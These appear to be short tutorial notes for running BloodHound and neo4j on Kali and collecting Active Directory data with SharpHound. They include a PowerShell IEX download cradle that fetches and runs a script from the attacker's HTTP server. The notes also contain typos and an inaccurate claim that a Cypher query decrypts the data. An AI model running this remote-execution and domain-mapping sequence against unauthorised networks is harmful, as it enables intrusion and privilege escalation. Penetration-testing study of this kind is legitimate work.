1. Set up java 8 on the kali machine - update-alternatives --config java
2. Install bloodhound and neo4j - apt install bloodhound neo4j
3. Use the terminal to start neo4j - neo4j console
4. Navigate to http://localhost:7474 and use neo4j default credentials to activate the browser: 
	Username: neo4j 
	Password: neo4j
5. Open the terminal and use bloodhound to start bloodhound - bloodhound
6. Download sharphound from github - git clone https://github.com/BloodHoundAD/BloodHound.git\
7. Navigate to Ingestors in BloodHound and start python http server - python -m SimpleHTTPServer
8. In windows 10 powershell use IEX to load sharphound - IEX(new-object net.webclient).downloadstring('http://[ip]:[port]/SharpHound.ps1')
9. Use Invoke-BloodHoud to select the collection method - Invoke-BloodHound -CollectionMethod default
10. Navigate to the directory of the output exported by BloodHound then drag and drop the zip file to the kali machine
11. Drag the zip file to the BloodHound web interface
12. Insert the following cypher to decrypt the json files that are loaded - MATCH (B)-[A] ->(R) RETURN B,A,R
13. Use queries  to explore the domain - Example: Shortest Phats to High-Value Targets